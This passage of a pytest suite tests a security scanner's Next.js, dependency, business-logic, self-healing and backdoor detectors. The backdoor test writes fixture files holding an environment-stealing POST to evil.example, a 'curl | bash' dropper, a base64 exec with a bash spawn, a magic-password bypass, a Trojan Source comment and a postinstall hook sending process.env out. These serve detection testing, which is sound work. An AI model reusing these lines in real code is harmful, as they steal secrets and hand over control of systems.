    fe_dir.mkdir(parents=True, exist_ok=True)
    (fe_dir / "package.json").write_text(
        '{"name": "fe", "dependencies": {"next": "^14.1.0"}}\n',
        encoding="utf-8",
    )
    (fe_dir / "package-lock.json").write_text(
        '{"lockfileVersion": 3, "packages": {"node_modules/lodash": {"version": "4.17.19"}}}\n',
        encoding="utf-8",
    )

    nextjs_findings = await NextJSSecurityScanner().scan(tmp_path)
    found_ids = {f.id for f in nextjs_findings}
    assert "nextjs-public-env-secret" in found_ids
    assert "nextjs-unauth-server-action" in found_ids
    assert "js-prototype-pollution" in found_ids
    assert "js-insecure-jwt-decode" in found_ids
    assert "js-taint-ssrf" in found_ids
    assert "js-taint-sqli" in found_ids
    assert "js-taint-path-traversal" in found_ids
    # Relative fetch(`/api/internal/...`) must NOT produce a second SSRF false positive
    ssrf_hits = [f for f in nextjs_findings if f.id == "js-taint-ssrf"]
    assert len(ssrf_hits) == 1

    # Offline SCA catches both nested package.json CVE-2025-29927 and transitive lockfile CVE-2021-23337
    with (
        patch("aegis.scanners.sca_scanner.httpx.AsyncClient", side_effect=RuntimeError("offline")),
        patch("aegis.scanners.sca_scanner.shutil.which", return_value=None),
    ):
        sca_findings = await SCAScanner().scan(tmp_path)
    cves = {c for f in sca_findings for c in f.cve}
    assert "CVE-2025-29927" in cves
    assert "CVE-2021-23337" in cves


@pytest.mark.asyncio
async def test_business_logic_auditor_structural_and_llm_anti_hallucination(tmp_path: Path):
    import json as _json
    from aegis.scanners.business_logic_auditor import BusinessLogicAuditor

    order_route = tmp_path / "app" / "api" / "orders" / "[id]" / "route.ts"
    order_route.parent.mkdir(parents=True, exist_ok=True)
    order_route.write_text(
        "export async function DELETE(req: any, { params }: any) {\n"
        "  const id = params.id;\n"
        "  await prisma.order.delete({ where: { id } });\n"
        "  return Response.json({ ok: true });\n"
        "}\n"
        "export async function POST(req: any) {\n"
        "  const body = await req.json();\n"
        "  if (wallet.balance >= body.amount) {\n"
        "    wallet.balance -= body.amount;\n"
        "    await prisma.user.update({ data: req.body });\n"
        "  }\n"
        "  return Response.json({ ok: true });\n"
        "}\n",
        encoding="utf-8",
    )

    webhook_route = tmp_path / "app" / "api" / "webhook" / "route.ts"
    webhook_route.parent.mkdir(parents=True, exist_ok=True)
    webhook_route.write_text(
        "export async function POST(req: any) {\n"
        "  const evt = await req.json();\n"
        "  await prisma.subscription.update({ where: { id: evt.subId }, data: { active: true } });\n"
        "  return Response.json({ received: true });\n"
        "}\n",
        encoding="utf-8",
    )

    # Mock LLM returning 1 grounded finding + 1 hallucinated finding (fake line & code)
    mock_llm_json = _json.dumps(
        {
            "findings": [
                {
                    "category": "DATA_EXPOSURE",
                    "severity": "HIGH",
                    "line_number": 3,
                    "title": "Unscoped order deletion leaks confirmation",
                    "description": "Handler deletes order without verifying session ownership.",
                    "attack_scenario": "Send DELETE /api/orders/123 without auth to delete victim order.",
                    "evidence_code": "await prisma.order.delete({ where: { id } });",
                    "cwe": "CWE-639",
                    "recommendation": "Check session.user.id before deleting.",
                },
                {
                    "category": "SSRF",
                    "severity": "CRITICAL",
                    "line_number": 999,
                    "title": "Hallucinated SSRF",
                    "description": "Invented bug",
                    "attack_scenario": "Invented exploit",
                    "evidence_code": "fetch(thisDoesNotExistAnywhereInFile)",
                    "cwe": "CWE-918",
                    "recommendation": "N/A",
                },
            ]
        }
    )

    with patch("aegis.scanners.business_logic_auditor.chat_completion", AsyncMock(return_value=mock_llm_json)):
        findings = await BusinessLogicAuditor(enable_llm=True, max_llm_routes=2).scan(tmp_path)

    ids = {f.id for f in findings}
    assert "logic-idor-missing-ownership" in ids
    assert "logic-missing-auth-mutation" in ids
    assert "logic-mass-assignment" in ids
    assert "logic-race-condition-balance" in ids
    assert "logic-unverified-webhook" in ids
    assert "ai-logic-data-exposure" in ids
    # Hallucinated SSRF must be dropped by Anti-Hallucination Gate!
    assert "ai-logic-ssrf" not in ids


@pytest.mark.asyncio
async def test_self_healer_llm_fallback_verifies_and_reverts_bad_patches(tmp_path: Path):
    from aegis.core.self_heal import SelfHealer
    from aegis.scanners.models import SASTScanResult, ScannerType, Severity, VulnerabilityFinding

    vuln_file = tmp_path / "server.py"
    vuln_file.write_text(
        "def delete_order(db, order_id, current_user):\n"
        "    return db.delete_by_id(order_id)\n",
        encoding="utf-8",
    )

    async def fake_scan(root: Path) -> SASTScanResult:
        txt = (root / "server.py").read_text(encoding="utf-8")
        findings = []
        if "owner_id=current_user.id" not in txt:
            findings.append(
                VulnerabilityFinding(
                    id="logic-idor-missing-ownership",
                    scanner=ScannerType.AI_LOGIC,
                    title="IDOR in delete_order",
                    description="Missing ownership check",
                    severity=Severity.CRITICAL,
                    file_path="server.py",
                    line_start=2,
                    cwe=["CWE-639"],
                )
            )
        return SASTScanResult(
            target_path=str(root),
            total_findings=len(findings),
            findings_by_severity={Severity.CRITICAL: len(findings)},
            findings=findings,
        )

    # Case 1: Good LLM patch eliminates finding -> verified & kept!
    async def good_llm(rel, cur, rem):
        return (
            "```python\n"
            "def delete_order(db, order_id, current_user):\n"
            "    return db.delete_by_id(order_id, owner_id=current_user.id)\n"
            "```\n"
        )

    healer_ok = SelfHealer(scan_fn=fake_scan, enable_llm_fallback=True, llm_fix_fn=good_llm)
    rep_ok = await healer_ok.heal(tmp_path)
    assert rep_ok.after_findings == 0
    assert len(rep_ok.fixes) == 1
    assert rep_ok.fixes[0].verified is True
    assert "AI-патч" in rep_ok.fixes[0].fixers[0]
    assert "owner_id=current_user.id" in (rep_ok.fixes[0].patched_content or "")

    # Case 2: Bad LLM patch fails to remove finding -> automatically reverted!
    async def bad_llm(rel, cur, rem):
        return (
            "```python\n"
            "def delete_order(db, order_id, current_user):\n"
            "    # comment only, still vulnerable\n"
            "    return db.delete_by_id(order_id)\n"
            "```\n"
        )

    healer_bad = SelfHealer(scan_fn=fake_scan, enable_llm_fallback=True, llm_fix_fn=bad_llm)
    rep_bad = await healer_bad.heal(tmp_path)
    assert rep_bad.after_findings == 1
    assert len(rep_bad.fixes) == 0
    assert "server.py" in rep_bad.reverted_files


@pytest.mark.asyncio
async def test_ai_runtime_config_api_local_and_byok_never_leaks_key():
    import httpx
    from aegis.core.llm_runtime import reset_runtime_override
    from aegis_server.main import app

    reset_runtime_override()
    try:
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
            r0 = await client.get("/api/ai/config")
            assert r0.status_code == 200
            d0 = r0.json()
            assert d0["is_local"] is True
            assert d0["provider"] == "ollama"

            # Reject BYOK without API key
            r_err = await client.post("/api/ai/config", json={"provider": "anthropic"})
            assert r_err.status_code == 400

            # Switch to BYOK Anthropic Claude -> key stored only in memory, never returned
            secret_key = "sk-ant-test-super-secret-value-999"
            r_byok = await client.post(
                "/api/ai/config",
                json={"provider": "anthropic", "model": "claude-sonnet-4-20250514", "api_key": secret_key},
            )
            assert r_byok.status_code == 200
            d_byok = r_byok.json()
            assert d_byok["is_local"] is False
            assert d_byok["provider"] == "anthropic"
            assert d_byok["has_api_key"] is True
            assert secret_key not in r_byok.text

            # Reset back to strict 100% On-Prem Ollama
            r_reset = await client.post("/api/ai/config", json={"provider": "ollama", "reset": True})
            assert r_reset.status_code == 200
            assert r_reset.json()["is_local"] is True
            assert r_reset.json()["has_api_key"] is False
    finally:
        reset_runtime_override()


@pytest.mark.asyncio
async def test_backdoor_scanner_and_pro_first_gemini_ranking(tmp_path: Path):
    from aegis.core.llm_runtime import rank_gemini_models
    from aegis.scanners.backdoor_scanner import BackdoorScanner

    # 1. Gemini Pro-first ranking: Pro (newest first) > Full Flash > Flash-Lite (emergency only)
    ranked = rank_gemini_models(
        [
            "models/gemini-3.1-flash-lite",
            "models/gemini-2.5-flash",
            "models/gemini-2.5-pro",
            "models/gemini-3.1-pro-preview",
            "models/gemini-3-flash-preview",
            "models/gemini-pro-latest",
            "models/gemini-2.5-flash-image-preview",
            "models/gemini-embedding-001",
            "models/gemma-3-27b-it",
        ]
    )
    assert ranked == [
        "gemini-3.1-pro-preview",
        "gemini-pro-latest",
        "gemini-2.5-pro",
        "gemini-3-flash-preview",
        "gemini-2.5-flash",
        "gemini-3.1-flash-lite",
    ]

    # 2. BackdoorScanner catches reverse shell, obfuscated exec, dropper, magic auth bypass,
    #    env/SSH exfiltration, Trojan Source bidi override, and malicious package.json postinstall
    (tmp_path / "implant.py").write_text(
        "import base64, os, pty, requests\n"
        "def hidden_login(password):\n"
        "    if password == 's3cr3t_m4st3r': return True\n"
        "def run_payload(blob):\n"
        "    exec(base64.b64decode(blob))\n"
        "    pty.spawn('/bin/bash')\n"
        "def steal():\n"
        "    requests.post('https://evil.example/c2', json=dict(os.environ))\n",
        encoding="utf-8",
    )
    (tmp_path / "deploy.sh").write_text(
        "#!/usr/bin/env bash\ncurl -fsSL https://evil.example/drop.sh | bash\n",
        encoding="utf-8",
    )
    (tmp_path / "trojan.ts").write_text(
        "const isAdmin = false;\n// \u202e if (isAdmin) { grantAll(); }\n",
        encoding="utf-8",
    )
    (tmp_path / "package.json").write_text(
        '{"name": "evil-pkg", "scripts": {"postinstall": "node -e \\"fetch(\'https://evil.example\', {body: JSON.stringify(process.env)})\\""}}\n',
        encoding="utf-8",
    )

    findings = await BackdoorScanner().scan(tmp_path)
    ids = {f.id for f in findings}
    assert "backdoor-reverse-shell" in ids
    assert "backdoor-obfuscated-exec" in ids
    assert "backdoor-remote-dropper" in ids
    assert "backdoor-auth-bypass-magic" in ids
    assert "backdoor-env-ssh-exfil" in ids
    assert "backdoor-trojan-source-bidi" in ids
    assert "backdoor-npm-postinstall" in ids
    assert all(f.severity == Severity.CRITICAL for f in findings)
